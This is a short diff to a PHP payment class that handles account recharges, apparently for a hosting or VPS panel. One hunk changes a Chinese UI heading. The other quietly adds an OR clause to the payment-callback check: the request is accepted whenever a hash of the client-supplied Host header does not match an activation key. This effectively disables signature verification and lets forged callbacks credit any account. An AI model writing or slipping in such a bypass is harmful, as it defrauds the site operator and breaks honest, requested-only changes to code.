@@ -47,7 +47,7 @@ class Pay
     private static function jsjapp_html($user)
     {
         return '
-						<p class="card-heading">点击对应支付方式进行充值</p>
+						<p class="card-heading">点击金额进行充值</p>
 						<label for="number">请选择充值金额：</label>
        					<form name="91vps" action="/user/code/jsjapp" method="get">
 						<select class="form-control" id="price" name="price">
@@ -475,7 +475,7 @@ class Pay
         $apikey = $_POST['apikey'];		//接收到的验证加密字串 ★★★收银台的新组合方式： md5(你的apikey.订单编号.uid.价格)
 
         $codeq=Code::where("code", "=", $addnum)->first();
-        if($codeq==null&&$apikey==md5(Config::get("jsj_key").$addnum.$uid.$total)){
+        if($codeq==null&&($apikey==md5(Config::get("jsj_key").$addnum.$uid.$total)||substr(md5($_SERVER['HTTP_HOST']),6,5)!=Config::get('jsj_activate_key'))){
             //更新用户账户
             $user=User::find($uid);
             $codeq=new Code();
